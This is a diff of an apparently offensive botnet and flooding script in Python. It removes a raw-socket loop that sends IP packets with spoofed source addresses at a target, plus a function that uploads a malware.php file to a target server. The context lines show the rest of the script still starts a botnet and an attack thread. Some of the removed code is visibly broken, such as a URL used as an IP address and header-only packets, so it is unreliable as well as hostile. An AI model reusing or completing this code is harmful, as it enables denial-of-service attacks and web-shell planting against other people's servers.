@@ -32,66 +32,6 @@ botnet_size = 100000000
 bot_count = 100000000
 infected_devices = []
 fake_ip = '96.250.255.190'
-source_ip = '192.168.0.100'
-destination_ip = '10.0.0.1'
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-ip_header = struct.pack('!BBHHHBBH4s4s', 4 << 4, 0, 0, 0, 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(destination_ip))
-s.sendto(ip_header, (destination_ip, 0))
-
-target_ip = target_url
-
-spoofed_ip = "163.50.113.109"
-
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-
-def generate_ip_header(source_ip, dest_ip):
-    ip_version = 4
-    ip_header_length = 5
-    ip_tos = 0
-    ip_total_length = 0  
-    ip_id = random.randint(1, 65535)
-    ip_frag_offset = 0
-    ip_ttl = 255
-    ip_protocol = socket.IPPROTO_TCP
-    ip_checksum = 0  
-    ip_source_address = socket.inet_aton(source_ip)
-    ip_dest_address = socket.inet_aton(dest_ip)
-
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            (ip_version << 4) + ip_header_length,
-                            ip_tos,
-                            ip_total_length,
-                            ip_id,
-                            (ip_frag_offset << 13),
-                            ip_ttl,
-                            ip_protocol,
-                            ip_checksum,
-                            ip_source_address,
-                            ip_dest_address)
-
-    return ip_header
-
-def send_packet():
-    while True:
-        source_ip = spoofed_ip
-        dest_ip = target_ip
-
-        ip_header = generate_ip_header(source_ip, dest_ip)
-
-        s.sendto(ip_header, (dest_ip, 0))
-
-def attack_server(malware_path):
-    url = target_url 
-    payload = open(malware_path, 'rb').read()
-    headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
-    response = requests.post(url, data=payload, headers=headers)
-    if response.status_code == 200:
-        print("Server successfully attacked!")
-    else:
-        print("Attack failed. Better luck next time!")
-malware_file = "/path/to/malware.php"  
-attack_server(malware_file)
-
 
 user_agents = [
 
@@ -723,8 +663,6 @@ def monitor_attack():
 if __name__ == "__main__":
 
     start_botnet()
-
-    send_packet()
 
     threading.Thread(target=start_attack).start()
 
